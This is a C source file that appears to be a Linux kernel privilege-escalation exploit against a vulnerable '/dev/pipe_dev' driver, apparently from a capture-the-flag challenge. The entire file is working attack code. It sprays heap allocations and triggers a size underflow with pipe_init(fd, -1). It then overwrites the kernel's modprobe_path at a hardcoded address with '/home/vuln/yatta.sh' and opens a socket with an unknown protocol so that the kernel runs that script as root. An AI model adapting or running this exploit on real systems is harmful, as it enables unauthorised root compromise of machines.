#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <netinet/in.h>

typedef struct my_pipe_buffer {
    size_t size;
    unsigned char *buffer;
    size_t read_index;
    size_t write_index;
} my_pipe_buffer_t;

struct pipe_buffer_param {
    uint64_t size;
    void *buffer;
};

#define IOCTL_PIPE_INIT _IOWR('p', 1, uint64_t)
#define IOCTL_PIPE_WRITE _IOWR('p', 2, struct pipe_buffer_param)
#define IOCTL_PIPE_READ _IOWR('p', 3, struct pipe_buffer_param)

int pipe_init(int fd, size_t size) {
    return ioctl(fd, IOCTL_PIPE_INIT, size);
}

int pipe_write(int fd, void *buffer, size_t size) {
    struct pipe_buffer_param param = { .size = size, .buffer = buffer };
    return ioctl(fd, IOCTL_PIPE_WRITE, &param);
}

int pipe_read(int fd, void *buffer, size_t size) {
    struct pipe_buffer_param param = { .size = size, .buffer = buffer };
    return ioctl(fd, IOCTL_PIPE_READ, &param);
}

int main(int argc, char const *argv[]) {
    for (int i = 0; i < 0x400 - 0x10; i++) {
        int fd = open("/dev/pipe_dev", O_RDONLY);
        pipe_init(fd, 0x20);
        close(fd);
    }

    int fd1 = open("/dev/pipe_dev", O_RDONLY);
    int fd2 = open("/dev/pipe_dev", O_RDONLY);

    pipe_init(fd1, -1); // underflow
    pipe_init(fd2, 0x20);

    my_pipe_buffer_t crafted_buffer;
    crafted_buffer.size = 0x100;
    crafted_buffer.buffer = (unsigned char *)0xffffffff82a5bda0;  // modprobe_path (manually added)
    crafted_buffer.read_index = 0x00;
    crafted_buffer.write_index = 0x00;

    pipe_write(fd2, &crafted_buffer, sizeof(crafted_buffer));

    char payload[] = "/home/vuln/yatta.sh";
    pipe_write(fd1, payload, sizeof(payload));

    // https://github.com/torvalds/linux/blob/ae64f9bd1d3621b5e60d7363bc20afb46aede215/net/socket.c#L1242C1-L1243C1
    // will invoke modprobe
    // 132 is a protocol we don't have on the system and so we modprobe it
    socket(AF_INET, SOCK_STREAM, 132);

    return 0;
}
